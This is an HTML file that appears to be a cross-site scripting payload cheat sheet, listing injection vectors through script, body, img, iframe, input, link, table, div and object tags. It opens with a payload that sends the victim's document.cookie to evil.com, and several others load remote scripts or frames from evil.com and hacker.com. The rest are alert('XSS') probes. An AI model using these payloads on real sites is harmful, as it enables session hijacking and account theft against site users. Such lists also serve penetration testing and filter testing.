<!-- Stealing Cookies Using XSS -->
<script>
  window.location = "http://evil.com/?cookie=" + encodeURIComponent(document.cookie);
</script>

<!-- External script -->
<script src="http://evil.com/xss.js"></script>

<!-- Embedded script -->
<script>
  // Bu sadece bir örnek, gerçek bir saldırı değildir.
  alert("XSS");
</script>

<!-- onload attribute in the <body> tag -->
<body onload="alert('XSS')">

<!-- background attribute -->
<body style="background-image: url('javascript:alert(\'XSS\')')">

<!-- <img> tag XSS -->
<img src="javascript:alert('XSS');">
<!-- <img> tag XSS using lesser-known attributes -->
<img dynsrc="javascript:alert('XSS')">
<img lowsrc="javascript:alert('XSS')">

<!-- <iframe> tag XSS -->
<iframe src="http://evil.com/xss.html"></iframe>

<!-- <input> tag XSS -->
<input type="image" src="javascript:alert('XSS');">

<!-- <link> tag XSS -->
<link rel="stylesheet" href="javascript:alert('XSS');">

<!-- <table> tag XSS -->
<table style="background-image: url('javascript:alert(\'XSS\')')">
  <!-- <td> tag XSS -->
  <td style="background-image: url('javascript:alert(\'XSS\')')"></td>
</table>

<!-- <div> tag XSS -->
<div style="background-image: url('javascript:alert(\'XSS\')')"></div>
<!-- <div> tag XSS -->
<div style="width: expression(alert('XSS'))"></div>

<!-- <object> tag XSS -->
<object type="text/x-scriptlet" data="http://hacker.com/xss.html"></object>
